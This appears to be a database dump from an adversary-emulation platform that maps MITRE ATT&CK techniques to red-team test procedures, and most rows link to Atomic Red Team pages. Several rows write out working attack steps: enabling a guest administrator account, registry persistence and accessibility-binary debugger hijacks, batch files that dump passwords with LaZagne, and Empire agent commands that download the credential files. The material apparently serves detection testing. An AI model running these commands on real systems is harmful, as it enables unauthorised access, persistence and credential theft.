"input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
135	\N	\N	\N	yes	MacOS Dependency.	\N	2021-08-24 14:11:29.833223+00	T1037.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1037.002/T1037.002.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.244Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
101	1. Install Microsoft Excel.\n2. Download atomic-red-team project.	\N	ps1	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1566.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/T1566.001.md\\"]"], "executor": ["powershell"], "platform": "", "file_name": null, "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.796Z", "pre-requisite": [], "pre-requistes": "1. Install Microsoft Excel.\\n2. Download atomic-red-team project.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
102	\N	\N	ps1	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1078.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"net user guest /active:yes\\nnet user guest Password123!\\nnet localgroup administrators guest /add\\nnet localgroup \\"Remote Desktop Users\\" guest /add\\nreg add \\"hklm\\\\system\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\\nreg add \\"hklm\\\\system\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\" /v \\"AllowTSConnections\\" /t REG_DWORD /d 0x1 /f\\",\\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md\\"]"], "executor": ["powershell"], "platform": "", "file_name": null, "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.808Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
107	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1059.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. Adversaries may abuse Unix shell commands and scripts for execution.\\", \\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.004/T1059.004.md\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.875Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
109	\N	\N	py	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1059.006	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. Use powershell empire multiplatform stager to emulate attack. Refer https://github.com/EmpireProject/Empire/blob/master/lib/stagers/multi/launcher.py\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.902Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
111	\N	\N	other	yes	["Need to find applications with vulnerabilities and then install to attack."]	\N	2021-08-24 14:11:29.833223+00	T1203	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior.\\", \\"2. https://enigma0x3.net/2016/03/15/phishing-with-empire/\\", \\"3. https://www.blackhillsinfosec.com/empires-cross-platform-office-macro/\\", \\"4. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems.\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.926Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
145	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1546.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.004/T1546.004.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.430Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
114	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1053.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.002/T1053.002.md\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.961Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
129	\N	T1547_003.reg	reg	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1547.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\\\n\\\\n\\n\\n[HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\W32Time\\\\TimeProviders\\\\gametime]\\\\n\\n\\"DllName\\"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,\\\\\\n  74,00,25,00,5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,76,\\\\\\n  00,6d,00,69,00,63,00,74,00,69,00,6d,00,65,00,70,00,72,00,6f,00,76,00,69,00,\\\\\\n  64,00,65,00,72,00,2e,00,64,00,6c,00,6c,00,00,00\\\\n\\n\\"Enabled\\"=dword:00000001\\\\n\\n\\"InputProvider\\"=dword:00000001\\\\n"], "executor": [""], "platform": "", "file_name": "T1547_003.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.142Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
132	\N	\N	\N	yes	MacOs	\N	2021-08-24 14:11:29.833223+00	T1547.007	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.007/T1547.007.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.195Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
137	\N	\N	\N	yes	MacOS Dependency.	\N	2021-08-24 14:11:29.833223+00	T1037.005	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1037.005/T1037.005.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.281Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
140	\N	\N	\N	yes	MacOS Dependency	\N	2021-08-24 14:11:29.833223+00	T1543.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.001/T1543.001.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.342Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
150	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1546.014	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.014/T1546.014.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.510Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
158	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1098	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.626Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
161	\N	\N	\N	yes	\N	\N	2021-08-31 06:45:58.325889+00	T1110.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1010.003.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.678Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
171	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1112	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.806Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
174	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1027.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.002/T1027.002.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.845Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
177	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1021.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.001/T1021.001.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.885Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
188	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1137.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros#weaponization"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.027Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
154	\N	\N	\N	yes	P2	\N	2021-08-24 14:11:29.833223+00	T1574.011	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.011/T1574.011.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.556Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
49	1. At least one listener is running.\n2. powershell-empire launcher_bat is installed on endpoint.\n3. Interact with agent.	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1057	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Run below command.\\nagent_id> tasklist"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.645Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
136	\N	\N	\N	yes	MacOS Dependency.	\N	2021-08-24 14:11:29.833223+00	T1037.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[ \\"type\\" : \\"RedAtomic\\",\\n\\"details\\" ; { \\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1037.004/T1037.004.md\\"}]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.270Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
195	"1.Initial steps similar to rules mentioned above.\n2. command used useradd <username> , optional to use -p command to include passoword"	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1136	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["\\"index: filebeat-*\\nquery: (match_body.message : type=SYSCALL AND *comm= useradd)\\""], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.110Z", "pre-requisite": [], "pre-requistes": "\\"1.Initial steps similar to rules mentioned above.\\n2. command used useradd <username> , optional to use -p command to include passoword\\"", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
204	1. At least one listener is running.\n2. powershell-empire launcher_bat is installed on endpoint.\n3. Interact with agent.	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1518.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Run below command.\\nagent_id> tasklist"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.158Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
178	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1021.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.897Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
205	1. At least one listener is running.\n2. powershell-empire launcher_bat is installed on endpoint.\n3. Interact with agent.	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1134	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Run below command.\\nagent_id> sysinfo"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.204Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
208	pre	cmd.txt	\N	yes	done	\N	2021-08-24 14:11:29.833223+00	T1583	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["{\\n  \\"x-acds-attack-ext\\": {\\n    \\"x-tool-names\\": {}\\n  }\\n}"], "executor": [""], "platform": "", "file_name": "cmd.txt", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.216Z", "pre-requisite": [], "pre-requistes": "pre", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
8	\N	APT41_T1546_008.reg	reg	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1546.008	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\utilman.exe]\\n\\"Debugger\\"=\\"c:\\\\\\\\Test.exe\\"\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\osk.exe]\\n\\"Debugger\\"=\\"c:\\\\\\\\Test.exe\\"\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\magnify.exe]\\n\\"Debugger\\"=\\"c:\\\\\\\\Test.exe\\"\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\narrator.exe]\\n\\"Debugger\\"=\\"c:\\\\\\\\Test.exe\\"\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\displayswitch.exe]\\n\\"Debugger\\"=\\"c:\\\\\\\\Test.exe\\"\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\atbroker.exe]\\n\\"Debugger\\"=\\"c:\\\\\\\\Test.exe\\"\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe]\\n\\"Debugger\\"=\\"c:\\\\\\\\Test.exe\\"\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\helppane.exe]\\n\\"Debugger\\"=\\"c:\\\\\\\\Test.exe\\""], "executor": [""], "platform": "", "file_name": "APT41_T1546_008.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.204Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
18	On Windows target:\n1. Download LaZagne source code from https://github.com/AlessandroZ/LaZagne on the endpoint.\nOn Kali:\n1. At least one listener is running.\n2. powershell-empire launcher_bat is installed on endpoint.\n3. Interact with agent.	MuddyWater_T1003_004.bat	bat	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1003.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["@ECHO OFF\\n\\ncmd /c C:\\\\Users\\\\user\\\\laZagne.exe all -oA -output C:\\\\Users\\\\users\\\\"], "executor": ["cmd"], "platform": "", "file_name": "MuddyWater_T1003_004.bat", "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.330Z", "pre-requisite": [], "pre-requistes": "On Windows target:\\n1. Download LaZagne source code from https://github.com/AlessandroZ/LaZagne on the endpoint.\\nOn Kali:\\n1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["1. upload and then execute MuddyWater_T1003_004.bat using below commands.\\nagent_id> upload MuddyWater_T1003_004.bat\\nagent_id> shell MuddyWater_T1003_004.bat\\n\\nIt will dump all passwords using below command.\\nshell C:\\\\Users\\\\user\\\\laZagne.exe all -oA -output C:\\\\Users\\\\users\\\\"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.332Z", "pre-requisite": [], "pre-requistes": "On Windows target:\\n1. Download LaZagne source code from https://github.com/AlessandroZ/LaZagne on the endpoint.\\nOn Kali:\\n1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
21	On Windows target:\n1. Download LaZagne source code from https://github.com/AlessandroZ/LaZagne on the endpoint.\nOn Kali:\n1. At least one listener is running.\n2. powershell-empire launcher_bat is installed on endpoint.\n3. Interact with agent.	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1003.005	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["1. upload and then execute MuddyWater_T1003_005.bat using below commands.\\nagent_id> upload MuddyWater_T1003_005.bat\\nagent_id> shell MuddyWater_T1003_005.bat\\n\\nIt will dump all passwords using below command.\\nshell C:\\\\Users\\\\user\\\\laZagne.exe all -oA -output C:\\\\Users\\\\users\\\\"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.344Z", "pre-requisite": [], "pre-requistes": "On Windows target:\\n1. Download LaZagne source code from https://github.com/AlessandroZ/LaZagne on the endpoint.\\nOn Kali:\\n1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["@ECHO OFF\\n\\ncmd /c C:\\\\Users\\\\user\\\\laZagne.exe all -oA -output C:\\\\Users\\\\users\\\\"], "executor": ["cmd"], "platform": "", "file_name": "MuddyWater_T1003_004.bat", "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.145Z", "pre-requisite": [], "pre-requistes": "On Windows target:\\n1. Download LaZagne source code from https://github.com/AlessandroZ/LaZagne on the endpoint.\\nOn Kali:\\n1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
22	1. At least one listener is running.\n2. powershell-empire launcher_bat is installed on endpoint.\n3. Interact with agent.	MuddyWater_T1036_005.bat	bat	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1036.005	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["@ECHO OFF\\n\\nreg add \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\" /v \\"WindowsDefenderUpdater\\" /t REG_EXPAND_SZ /d \\"cmstp.exe /s c:\\\\programdata\\\\DefenderService.inf\\" /f"], "executor": ["cmd"], "platform": "", "file_name": "MuddyWater_T1036_005.bat", "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.359Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["1. upload and then execute MuddyWater_T1036_005.bat using below commands.\\nagent_id> upload MuddyWater_T1036_005.bat\\nagent_id> shell MuddyWater_T1036_005.bat\\n\\nIt will create registry key for persistence using below command.\\nreg add \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\" /v \\"WindowsDefenderUpdater\\" /t REG_EXPAND_SZ /d \\"cmstp.exe /s c:\\\\programdata\\\\DefenderService.inf\\" /f"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.370Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
126	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1098.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"https://support.microsoft.com/en-us/office/add-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d?ui=en-us&rs=en-us&ad=us\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.098Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
35	\N	T1546_002.reg	reg	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1546.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\n\\n[HKEY_CURRENT_USER\\\\Control Panel\\\\Desktop]\\n\\"ScreenSaveActive\\"=\\"1\\"\\n\\"ScreenSaverIsSecure\\"=\\"0\\"\\n\\"ScreenSaveTimeout\\"=\\"1200\\"\\n\\"SCRNSAVE.EXE\\"=\\"\\\\\\\\\\\\\\\\PTDHCP2.persistent.co.in\\\\\\\\GPO\\\\\\\\PersistentScreenSaver2017.scr\\"\\n\\n[HKEY_CURRENT_USER\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\Control Panel\\\\Desktop]\\n\\"ScreenSaveActive\\"=\\"1\\"\\n\\"ScreenSaverIsSecure\\"=\\"0\\"\\n\\"ScreenSaveTimeOut\\"=\\"900\\"\\n\\"SCRNSAVE.EXE\\"=\\"\\\\\\\\\\\\\\\\PTDHCP2.persistent.co.in\\\\\\\\GPO\\\\\\\\PersistentScreenSaver2017.scr\\"\\n"], "executor": [""], "platform": "", "file_name": "T1546_002.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.501Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
42	\N	T1557_001.reg	reg	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1557.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\DNSClient]\\n\\"EnableMulticast\\"=dword:00000001\\n"], "executor": [""], "platform": "", "file_name": "T1557_001.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.550Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
46	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1041	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Download credential files created by LaZagne tool in T1555/T1555.003 technique above.\\nUse below command.\\nagent_id> download C:\\\\users\\\\user\\\\credentials_<randomstring>.json"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.599Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
179	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1496	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1496/T1496.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.913Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
